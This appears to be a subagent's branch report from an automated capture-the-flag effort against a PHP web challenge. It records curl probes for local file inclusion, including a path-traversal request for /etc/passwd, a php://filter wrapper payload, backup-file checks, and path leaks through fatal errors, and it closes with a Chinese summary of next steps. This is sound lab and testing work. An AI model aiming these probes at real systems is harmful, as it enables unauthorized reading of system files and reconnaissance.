## Branch Result
direction: page-lfi-route-probe
subagent_id: branch_001
status: FEASIBLE

### 发现
- `?page=` appears route-mapped/validated. Valid unauthenticated pages: `home`, `login`, `flag`; invalid names, traversal, encoded traversal, null-byte suffixes, and PHP wrappers redirect to `/?page=home`.
- Direct PHP fragments under `/pages/` are web-accessible and disclose absolute filesystem paths via fatal errors when called outside `index.php`.
- Flag route path disclosed: `/var/www/html/pages/flag.php`. Direct request to `/pages/flag.php` calls undefined `is_admin()` and leaks the path and line number.
- Arbitrary username login is accepted via `POST /login.php user=probe_user`, revealing authenticated routes: `?page=notes`, `?page=add`, `?page=note`, and action routes `export.php?type=zip|tar`. This did not grant admin.
- No confirmed LFI/file-read via `?page=`, no PHP wrapper inclusion, and no backup/source extension disclosure found in this branch.

### 命令和结果
```bash
curl -i -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=flag'
```
Result: `200 OK`, body includes `<h2>Get flag</h2>` and `You are not an admin :(`.

```bash
curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=../../../../etc/passwd'
curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=php://filter/convert.base64-encode/resource=index'
```
Result: both return `302 Found` with `Location: /?page=home`; no `/etc/passwd` or base64 source output.

```bash
curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/flag.php'
```
Result excerpt:
```html
Fatal error: Uncaught Error: Call to undefined function is_admin() in /var/www/html/pages/flag.php:5
```

```bash
curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/home.php'
curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/notes.php'
curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/note.php'
```
Results:
- `/pages/home.php`: fatal `undefined function is_logged_in()` at `/var/www/html/pages/home.php:5`.
- `/pages/notes.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/notes.php:2`.
- `/pages/note.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/note.php:2`.

```bash
sid=$(curl -sS -i -X POST 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/login.php' --data 'user=probe_user' | awk -F'[=;]' '/Set-Cookie: PHPSESSID=/{print $2; exit}')
curl -sS -i -H "Cookie: PHPSESSID=$sid" 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=home'
```
Result: logged-in navbar exposes `?page=notes`, `?page=add`, `export.php?type=zip`, and `export.php?type=tar`.

```bash
# Source/backup disclosure spot checks on discovered files:
/index.php~ /index.phps /index.php.bak
/login.php~ /login.phps /login.php.bak
/config.php~ /config.phps /config.php.bak
/lib.php~ /lib.phps /lib.php.bak
/pages/flag.php~ /pages/flag.phps /pages/flag.php.bak
```
Result: checked variants returned `404 Not Found`; normal `/config.php`, `/lib.php`, `/init.php` execute with empty output.

### 结论
可行。`?page` 本身未确认 LFI/path traversal/wrapper 读文件，但直接访问 `/pages/*.php` 泄露了路由和绝对路径，包含 flag 页面路径 `/var/www/html/pages/flag.php`；登录任意用户名还可枚举登录态页面路由。建议主线优先围绕已披露的 `/pages/flag.php`、`is_admin()`、`lib.php/config.php/init.php`、登录态路由和导出功能继续分析。
